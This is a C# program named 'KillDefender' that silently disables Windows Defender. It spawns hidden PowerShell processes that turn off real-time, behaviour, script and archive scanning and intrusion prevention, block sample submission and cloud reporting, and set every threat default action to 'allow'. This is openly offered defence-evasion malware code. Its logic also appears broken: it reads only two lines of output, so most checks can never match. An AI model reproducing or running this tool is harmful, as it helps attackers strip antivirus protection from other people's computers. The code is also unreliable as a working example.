using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;

namespace KillDefender
{
    public class execute
    {
        public static void RunPS(string args)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
        }
        public static void RunCMD(string command)
        {
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"C:\Windows\System32\cmd.exe",
                    Arguments = "/c " + command,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WorkingDirectory = @"C:\"
                }
            };
            proc.Start();
        }
    }
    class Program
    {
        static void Main()
        {
            CheckDefender();
        }
        public static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = @"%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            string output = proc.StandardOutput.ReadLine();
            string line = proc.StandardOutput.ReadLine();

            if (output.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
            if (output.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
            if (output.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
            if (output.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableIOAVProtection $true");
            if (output.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisablePrivacyMode $true");
            if (output.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
            if (output.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableArchiveScanning $true");
            if (output.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
            if (output.StartsWith(@"DisableScriptScanning") && line.EndsWith("False")) execute.RunPS("Set-MpPreference -DisableScriptScanning $true");
            if (output.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2")) execute.RunPS("Set-MpPreference -SubmitSamplesConsent 2");
            if (output.StartsWith(@"MAPSReporting") && !line.EndsWith("0")) execute.RunPS("Set-MpPreference -MAPSReporting 0");

            if (output.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
            if (output.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
            if (output.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -LowThreatDefaultAction 6");
            if (output.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6")) execute.RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
        }
    }
}
